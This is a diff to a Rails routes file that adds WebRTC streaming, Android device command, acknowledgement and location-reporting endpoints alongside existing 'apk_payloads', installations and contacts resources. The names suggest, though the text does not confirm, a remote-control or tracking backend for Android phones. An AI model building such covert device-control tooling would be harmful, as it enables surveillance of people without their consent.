@@ -1,4 +1,25 @@
 Rails.application.routes.draw do
+  # WebRTC & Live Streaming
+  get 'webrtc/turn_credentials', to: 'webrtc#turn_credentials'
+  post 'webrtc/signal', to: 'webrtc#signal'
+
+  # REST API for Android devices (fallback for WebSocket)
+  namespace :api do
+    get 'config', to: 'config#show'
+    resources :commands, only: [:show] do
+      member do
+        post :ack
+      end
+    end
+    post 'location', to: 'commands#location'
+    get 'devices/online', to: 'devices#online'
+  end
+
+  # Admin config save endpoint
+  namespace :admin do
+    post 'android_config/update', to: 'android_config#update'
+  end
+
   resources :apk_installations
   resources :apk_payloads
   resources :contacts do
